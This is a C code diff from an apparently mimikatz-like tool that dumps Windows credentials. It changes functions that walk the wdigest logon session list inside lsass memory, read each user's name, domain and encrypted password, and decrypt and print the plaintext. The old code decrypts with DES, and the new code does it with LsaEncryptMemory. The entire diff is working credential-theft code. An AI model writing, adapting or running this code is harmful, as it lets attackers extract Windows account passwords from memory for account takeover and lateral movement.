@@ -36,66 +36,61 @@ cleanup:
 	return lpLogSessList;
 }
 
-BOOL ReadProcessLSAString(IN HANDLE hProc, IN PLSA_UNICODE_STRING lpUStr, OUT LPBYTE lpBuff)
+BOOL ReadLsassLSAString(IN PLSA_UNICODE_STRING lpUStr, OUT LPBYTE lpBuff)
 {
 	if (lpUStr->Buffer == NULL)
 		return FALSE;
-	SIZE_T cbMemoryRead;
-	BOOL bRet = ReadProcessMemory(hProc, lpUStr->Buffer, lpBuff, lpUStr->Length + 2, &cbMemoryRead);
+	BOOL bRet = ReadLsassMemory(lpUStr->Buffer, lpBuff, lpUStr->Length + 2);
 	RETN_IF(!bRet, L"ReadProcessMemory", FALSE);
 	return TRUE;
 }
+
+BOOL ReadLsassLSABuffer(IN PLSA_UNICODE_STRING lpUStr, OUT LPBYTE lpBuff)
+{
+	if (lpUStr->Buffer == NULL)
+		return FALSE;
+	BOOL bRet = ReadLsassMemory(lpUStr->Buffer, lpBuff, lpUStr->MaximumLength);
+	RETN_IF(!bRet, L"ReadProcessMemory", FALSE);
+	return TRUE;
+}
+
 #define MAX_NAME 64
 #define MAX_PASSWORD_BUFF 256
-BOOL Wdigest_LogSessList_Dump(IN HANDLE hLsass, IN LPBYTE lpKey, IN DWORD cbKey,
-	IN LPBYTE lpIV, IN DWORD cbIV)
+BOOL Wdigest_LogSessList_Dump()
 {
 	LPVOID lpLogSessList = Find_l_LogSessList();
-	SIZE_T cbMemoryRead;
 	BOOL   bRet;
 	RETN_MSG_IF(lpLogSessList == NULL, FALSE, L"cant find wdigest!l_LogSessList\r\n");
 	MESSAGE(L"wdigest!l_LogSessList in lsass 0x%p\r\n", lpLogSessList);
 
 	KIWI_WDIGEST_LIST_ENTRY  szWdigestListEntry = { 0 };
 	PKIWI_WDIGEST_LIST_ENTRY lpListEntry        = &szWdigestListEntry;
-	bRet = ReadProcessMemory(hLsass, lpLogSessList, lpListEntry,
-		sizeof(PKIWI_WDIGEST_LIST_ENTRY), &cbMemoryRead);
+	bRet = ReadLsassMemory(lpLogSessList, lpListEntry, sizeof(PKIWI_WDIGEST_LIST_ENTRY));
 	RETN_IF(!bRet, L"ReadProcessMemory", FALSE);
 
 	TCHAR szUserName[MAX_NAME], szDomain[MAX_NAME], szDnsDomain[MAX_NAME];
 	BYTE  szEncPassword[MAX_PASSWORD_BUFF] = { 0 };
-	BYTE  szDecPassword[MAX_NAME] = { 0 };
 	//±éÀúÁ´±í
 	do {
-		bRet = ReadProcessMemory(hLsass, lpListEntry->Flink,
-			&szWdigestListEntry, sizeof(szWdigestListEntry), &cbMemoryRead);
+		bRet = ReadLsassMemory(lpListEntry->Flink,
+			&szWdigestListEntry, sizeof(szWdigestListEntry));
 		RETN_MSG_IF(lpLogSessList == NULL, FALSE, L"wdigest list entry list incomplete or read error?\r\n");
 		//MESSAGE(L"Blink:%p,Flink:%p\r\n", lpListEntry->Blink, lpListEntry->Flink);
-		if (!ReadProcessLSAString(hLsass, &lpListEntry->UserName, (LPBYTE)&szUserName))
+		if (!ReadLsassLSAString(&lpListEntry->UserName, (LPBYTE)&szUserName))
 			szUserName[0] = 0;
-		if (!ReadProcessLSAString(hLsass, &lpListEntry->Domain, (LPBYTE)&szDomain))
+		if (!ReadLsassLSAString(&lpListEntry->Domain, (LPBYTE)&szDomain))
 			szDomain[0] = 0;
-		if (!ReadProcessLSAString(hLsass, &lpListEntry->DnsDomain, (LPBYTE)&szDnsDomain))
+		if (!ReadLsassLSAString(&lpListEntry->DnsDomain, (LPBYTE)&szDnsDomain))
 			szDnsDomain[0] = 0;
 		MESSAGE(L"%s\\%s (%s):", szUserName, szDomain, szDnsDomain);
-		bRet = ReadProcessLSAString(hLsass, &lpListEntry->EncryptedPassword, (LPBYTE)&szEncPassword);
+		bRet = ReadLsassLSAString(&lpListEntry->EncryptedPassword, (LPBYTE)&szEncPassword);
 		if (!bRet)
 		{
 			MESSAGE(L"[]\r\n");
 			continue;
 		}
-		ZeroMemory(szDecPassword, MAX_NAME);
-		bRet = DesDecrypt(szEncPassword, lpListEntry->EncryptedPassword.Length, lpKey,
-			cbKey, lpIV, cbIV, szDecPassword, MAX_NAME
-		);
-		if (bRet)
-		{
-			MESSAGE(L"[%s]\r\n", (LPWSTR) &szDecPassword);
-		}
-		else 
-		{
-			MESSAGE(L"[decrypt password faild!]");
-		}
+		LsaEncryptMemory(szEncPassword, lpListEntry->EncryptedPassword.Length, 0);
+		MESSAGE(L"[%s]\r\n", (LPWSTR) &szEncPassword);
 	} while (lpListEntry->Flink != lpLogSessList);
 	return TRUE;
 }
